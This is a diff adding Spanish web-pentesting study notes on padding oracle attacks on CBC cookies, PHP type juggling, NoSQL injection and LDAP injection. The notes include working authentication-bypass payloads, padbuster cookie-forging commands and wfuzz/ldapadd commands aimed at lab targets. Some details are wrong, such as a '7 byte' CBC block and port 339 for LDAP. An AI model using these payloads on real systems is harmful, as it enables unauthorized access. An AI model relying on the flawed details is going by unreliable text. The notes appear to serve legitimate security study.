@@ -599,3 +599,164 @@ print(js_code)
 
 - Se cifra de esta manera
 ![[Pasted image 20250321010737.png]]
+
+#### Cifrado CBC 
+- Una cadena con este cifrado tiene siempre **7 bytes**
+- **Cada caracter es 1 byte**  u 8 bits
+- Si no llega a los bytes se rellena con los siguientes valores --> 0x02 en cada casilla si faltan 2 bytes o 0x03 si faltasen 3
+- Primero descifra y luego limpia el relleno 
+- Si hubiese limpieza inválida ahí tenemos **Oracle Padding**
+
+> Nos debemos dar cuenta de cuándo se acontece esa limpieza inválida
+
+- Error
+- Falta de resultados
+- Respuesta lenta
+- O partir de un texto en claro y cifrarlo
+
+![[Captura de pantalla 2025-03-21 130554.png|750x300]]
+- Operando con **XOR**^[1] con El bloque **Encrypted E7** ^ **Intermediate I15** = C15 
+![[Captura de pantalla 2025-03-21 132604.png|700x300]]
+
+>**XOR:** los 0^0 se representan con 0,los 1^1 se representan con un 0 y los 0^1 se representan como 1
+
+
+Operación XOR
+
+0110
+^
+1010
+
+Resultado --> 1100
+
+> Pasamos a descifrar una cookie que hemos detectado que es cifrada con CBC
+
+- Debe ser **múltiplo de 8**
+- En este caso crackeamos la cookie
+
+
+```bash
+pasbuster http://urlquesea.com cifradoacrackear 8 -cookie 'auth=cookieentera'
+```
+
+- La descifra en **2 bloques**
+
+![[Pasted image 20250321190418.png|400]]
+
+![[Pasted image 20250321190351.png|400]]
+
+> Ahora enviaremos el user que suponemos que está autenticado
+
+```bash
+pasbuster http://urlquesea.com cifradoacrackear 8 -cookie 'auth=cookieentera' -plaintext 'user=admin'
+ ```
+- Nos da la cookie y nos logeamos en el browser
+> Importante ver este Writeup [OraclePadding](https://www.vulnhub.com/entry/pentester-lab-padding-oracle,174/)
+
+> Fuerza Bruta de **Bit Flipper con burpsuite**
+
+ - Resulta que la cookie cambia en algunos bytes en toda la APP web , si el nombre de usuario es parecido al de admin y con burp vamos cambiando el relleno con un bruteforce
+
+![[Pasted image 20250322003520.png]]
+
+## Type  Juggling
+
+> Conversión de un tipo de dato a otro de una variable en un programa, en este caso lo pasamos como un array
+
+- En los parámetros enviados en la petición poner []
+
+`username=admin&password[]=`
+
+**TE DA ACCESO CON ESTO**
+
+![[Pasted image 20250322005420.png]]
+
+
+> Si el backedn tiene un hash md5 **0ertert8456df4df7e5r4bf4578d5s** y hasheamos una palabra y empieza por 0, lo que está comparando en el backend son 2 ceros esto es debido a que se almacena la contraseña como un número entero y no como un string.
+
+**TIENE QUE EMPEZAR POR** 0e
+
+```php
+$value1 = 0ertert8456df4df7e5r4bf4578d5s;
+$value2 = 0
+
+# Está tratando los valores elevando 0^loquesea 
+# Por lo tanto 0 = 0
+```
+
+- Se debe poner `===` para que iguale los int(tipo de dato número)
+
+- Crackeo: si hasheamos una palabra que empiece por 0, no comparará todo el string del hash si no sólo el 0 del primero, **a la aplicación le debemos de dar la palabra sin hashear**
+
+>En PHP, una cadena que comienza con un número se convierte automáticamente en un número si se utiliza en una comparación numérica
+
+> Buscar por hashes mágicos o 0e hash colision
+
+- [Aquí hay hashes mágicos](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html)
+
+
+## NoSQL
+
+- Son BD que no utilizan **tablas o columnas** sino **documentos, clave-valores, grafos** etc...
+
+>Utilizan bases de datos **NoSQL, como MongoDB, Cassandra y CouchDB**
+
+- **PAYLOADS**
+
+```bash
+'||1||'
+```
+
+- [PayloadsAlltheThingsNoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)
+- [HAckTricksNoSqlInjection](https://book.hacktricks.wiki/es/pentesting-web/nosql-injection.html)
+
+> En una petición que se envíe por **GET**, podemos cambiar el **Content-Type: application/x-www-form-urlencoded**
+> y dejarlo de la siguiente manera, cambiando tbb el parámetro a JSON
+
+![[Pasted image 20250322164509.png]]
+
+## LDAP Injection
+
+- Software para administrar la información de una empresa que utiliza Linux, como Active Directoy en Windows
+- Tiramos tosos los cript de ldap de nmap al **Puerto 389**
+
+```bash
+nmap --script ldap\* -p339 172.27.0.1
+```
+
+- Una vez ya enumerado, recopilamos info
+
+```bash
+ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
+```
+- Filtrar por descripción a ver que sale 
+```bash
+ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=*))'
+```
+
+- Si el login está mal sanitizado podemos hacer:
+
+`username=admin&password=*`
+`username=a*&password=*`
+`username=admin))%00&password=sddd`
+`username=admin)(FUZZ=\*))%00&password=sddd`
+
+- Brute Force a un atibuto con wfuzz, nos tendrá que soltar un código de estado **301**
+
+```bash
+wfuzz -c --hc=404,400,403 -w /home/kuser/cosas/repositorios/SecLists/Fuzzing/LDAP-active-directory-attributes.txt  -d 'username=admin)(FUZZ=*))%00&password=sddd' http://localhost:8080
+```
+
+admin)(FUZZ=\*))%00&password=sddd`
+
+- Esta estructura tiene el fichero para crear un usuario en el sistema una vez ya enumerado
+![[Pasted image 20250322180944.png]]
+
+- Lo creamos con 
+```bash
+ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f new-user.ldif
+```
+
+
+### Deserialization Attack
+
